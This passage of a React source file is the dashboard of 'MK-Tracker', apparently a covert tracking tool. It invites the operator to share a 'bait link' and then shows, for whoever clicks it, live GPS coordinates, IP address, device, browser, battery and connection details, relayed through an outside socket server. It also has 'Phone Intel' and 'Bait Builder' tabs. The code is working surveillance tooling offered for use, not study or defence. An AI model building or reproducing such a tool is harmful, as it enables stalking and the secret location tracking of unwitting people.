                display: 'flex', alignItems: 'center', justifyContent: 'center'
              }}>
                <IconTarget size={24} color="var(--accent)" />
              </div>
              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 13, fontWeight: 600, color: 'var(--t2)', marginBottom: 4 }}>Waiting for GPS Ping</div>
                <div style={{ fontSize: 11, color: 'var(--t3)' }}>Share a bait link to track device location.</div>
              </div>
              <button className="btn btn-primary" style={{ marginTop: 4 }} onClick={getLink}>
                <IconPlus size={14} color="white" />
                <span>Get Tracking Link</span>
              </button>
            </div>
          )}
        </div>

        {/* Device info strip */}
        {active && (
          <div style={{
            borderTop: '1px solid var(--line)',
            background: 'var(--bg-1)',
            padding: '10px 16px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            gap: 16,
            flexShrink: 0
          }}>
            <div style={{ display: 'flex', gap: 24, overflowX: 'auto', flex: 1, paddingBottom: 2 }}>
              {[
                { k: 'IP',         v: active.ipAddress,               mono: true },
                { k: 'Device',     v: active.deviceInfo?.deviceType                },
                { k: 'OS',         v: active.platform                              },
                { k: 'Browser',    v: active.deviceInfo?.browser                   },
                { k: 'Screen',     v: active.deviceInfo?.screenSize,  mono: true  },
                { k: 'TZ',         v: active.deviceInfo?.timeZone                  },
                { k: 'Lang',       v: active.deviceInfo?.language,    mono: true  },
                { k: 'CPU',        v: active.deviceInfo?.cores,       mono: true  },
                { k: 'RAM',        v: active.deviceInfo?.memory,      mono: true  },
                { k: 'Battery',    v: active.battery != null ? `${active.battery}%` : null, mono: true },
                { k: 'Signal',     v: active.connection                            },
                { k: 'Accuracy',   v: active.info?.accuracy ? `±${active.info.accuracy.toFixed(0)}m` : null },
              ].filter(f => f.v).map(f => (
                <div key={f.k} style={{ flexShrink: 0 }}>
                  <div style={{ fontSize: 10, color: 'var(--t3)', textTransform: 'uppercase', letterSpacing: '.05em', marginBottom: 2 }}>{f.k}</div>
                  <div className={f.mono ? 'mono' : ''} style={{ fontSize: 12, color: f.mono ? 'var(--accent)' : 'var(--t1)', fontWeight: 500 }}>{f.v}</div>
                </div>
              ))}
            </div>
            {active.coords && (
              <a
                href={`https://www.google.com/maps/search/?api=1&query=${active.coords.lat},${active.coords.lng}`}
                target="_blank"
                rel="noopener noreferrer"
                className="btn btn-ghost"
                style={{
                  padding: '6px 12px',
                  fontSize: 11,
                  color: 'var(--accent)',
                  borderColor: 'rgba(99, 102, 241, 0.3)',
                  textDecoration: 'none',
                  display: 'flex',
                  alignItems: 'center',
                  gap: 6,
                  flexShrink: 0,
                }}
              >
                <IconExternalLink size={12} color="var(--accent)" />
                <span>Google Maps Link</span>
              </a>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

/* ─── MAIN DASHBOARD ───────────────────────────────────────────────────────── */
export default function Dashboard() {
  const [trackers, setTrackers]   = useState({});
  const [activeId, setActiveId]   = useState(null);
  const [socket,   setSocket]     = useState(null);
  const [tab,      setTab]        = useState('live');
  const ref = useRef({});

  const [myId, setMyId]           = useState('');

  useEffect(() => {
    const s = localStorage.getItem('trackerId') || generateId();
    localStorage.setItem('trackerId', s);
    setMyId(s);
  }, []);

  const autoAdd = useCallback((id, data) => {
    ref.current = {
      ...ref.current,
      [id]: {
        coords: (data.lat && data.lng) ? { lat: data.lat, lng: data.lng } : ref.current[id]?.coords,
        info: { accuracy: data.accuracy, speed: data.speed, heading: data.heading, timestamp: data.timestamp },
        deviceInfo: data.device_info || ref.current[id]?.deviceInfo,
        platform: data.platform || ref.current[id]?.platform,
        ipAddress: data.ip_address || ref.current[id]?.ipAddress,
        battery: data.battery ?? ref.current[id]?.battery,
        connection: data.connection || ref.current[id]?.connection,
        alias: data.alias,
        lastUpdate: Date.now(),
      },
    };
    setTrackers({ ...ref.current });
    setActiveId(p => p || id);
  }, []);

  const removeTracker = id => {
    if (id === myId) return;
    const n = { ...ref.current };
    delete n[id];
    ref.current = n;
    setTrackers({ ...n });
    setActiveId(p => p === id ? (Object.keys(n)[0] || myId) : p);
  };

  const getLink = async () => {
    const url = `${window.location.origin}/track?id=${myId}`;
    try {
      if (navigator.share) await navigator.share({ url });
      else {
        await navigator.clipboard.writeText(url);
        alert('Link copied to clipboard!');
      }
    } catch {}
  };

  useEffect(() => {
    if (!myId) return;

    const s = io('https://mk-tracker.onrender.com');
    setSocket(s);
    const di = getDeviceInfo();
    s.emit('join_tracker', { tracker_id: myId, deviceInfo: di });
    setActiveId(prev => prev || myId);

    const saved = JSON.parse(localStorage.getItem('watchedTrackers') || '[]');
    saved.forEach(id => { if (id && id !== myId) s.emit('join_tracker', { tracker_id: id, deviceInfo: di }); });

    s.on('location_update', data => {
      autoAdd(data.tracker_id, data);
      if (data.tracker_id !== myId) {
        const ws = JSON.parse(localStorage.getItem('watchedTrackers') || '[]');
        if (!ws.includes(data.tracker_id)) localStorage.setItem('watchedTrackers', JSON.stringify([...ws, data.tracker_id]));
      }
    });
    s.on('reconnect', () => {
      const di2 = getDeviceInfo();
      s.emit('join_tracker', { tracker_id: myId, deviceInfo: di2 });
      Object.keys(ref.current).forEach(id => { if (id !== myId) s.emit('join_tracker', { tracker_id: id, deviceInfo: di2 }); });
    });
    return () => s.disconnect();
  }, [myId, autoAdd]);

  const TABS = [
    { id: 'live',  label: 'Live Trackers', count: Object.keys(trackers).length },
    { id: 'phone', label: 'Phone Intel',   count: null },
    { id: 'bait',  label: 'Bait Builder',  count: null },
  ];

  return (
    <div style={{ height: '100vh', display: 'flex', flexDirection: 'column', background: 'var(--bg)', overflow: 'hidden' }}>

      {/* Top nav */}
      <nav style={{ height: 48, borderBottom: '1px solid var(--line)', display: 'flex', alignItems: 'center', padding: '0 16px', gap: 0, flexShrink: 0, background: 'var(--bg-1)' }}>
        {/* Brand */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginRight: 20 }}>
          <div style={{ width: 26, height: 26, borderRadius: 6, background: 'var(--accent)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.3" strokeLinecap="round" strokeLinejoin="round">
              <path d="M17.657 16.657L13.414 20.9a2 2 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/>
              <circle cx="12" cy="11" r="3"/>
            </svg>
          </div>
          <span style={{ fontSize: 13, fontWeight: 700, color: 'var(--t1)' }}>MK-Tracker</span>
        </div>

        {/* Divider */}
        <div style={{ width: 1, height: 20, background: 'var(--line)', marginRight: 16 }} />

        {/* Tabs */}
        <div style={{ display: 'flex', gap: 2 }}>
          {TABS.map(t => (
            <button key={t.id} onClick={() => setTab(t.id)} style={{
              padding: '5px 12px', borderRadius: 6, border: 'none', cursor: 'pointer',
              background: tab === t.id ? 'var(--bg-3)' : 'transparent',
              color: tab === t.id ? 'var(--t1)' : 'var(--t3)',
              fontSize: 12, fontWeight: tab === t.id ? 600 : 400,
              display: 'flex', alignItems: 'center', gap: 6,
              transition: 'all .1s',
            }}>
              {t.label}
              {t.count !== null && t.count > 0 && (
                <span style={{ padding: '1px 5px', borderRadius: 3, fontSize: 10, fontWeight: 700, background: 'var(--accent-soft)', color: 'var(--accent)' }}>
                  {t.count}
                </span>
              )}
            </button>
          ))}
        </div>

        {/* Right side */}
        <div style={{ marginLeft: 'auto', display: 'flex', alignItems: 'center', gap: 12 }}>
          <span className="badge-live">LIVE</span>
          <div className="mono" style={{ fontSize: 10, color: 'var(--t3)', background: 'var(--bg-2)', padding: '3px 8px', borderRadius: 4, border: '1px solid var(--line)' }}>
            {myId}
          </div>
          <div style={{ width: 7, height: 7, borderRadius: '50%', background: socket?.connected ? 'var(--green)' : 'var(--red)' }} title={socket?.connected ? 'Connected' : 'Disconnected'} />
        </div>
      </nav>

      {/* Content */}
      <div style={{ flex: 1, overflow: 'hidden', display: 'flex', flexDirection: 'column' }}>
        {tab === 'live'  && <LiveTab trackers={trackers} activeId={activeId} setActiveId={setActiveId} myId={myId} removeTracker={removeTracker} getLink={getLink} />}
        {tab === 'phone' && <div style={{ flex: 1, overflowY: 'auto' }}><PhoneIntelTab /></div>}
        {tab === 'bait'  && <div style={{ flex: 1, overflow: 'hidden', display: 'flex', flexDirection: 'column' }}><BaitBuilderTab trackerId={myId} /></div>}
      </div>
    </div>
  );
}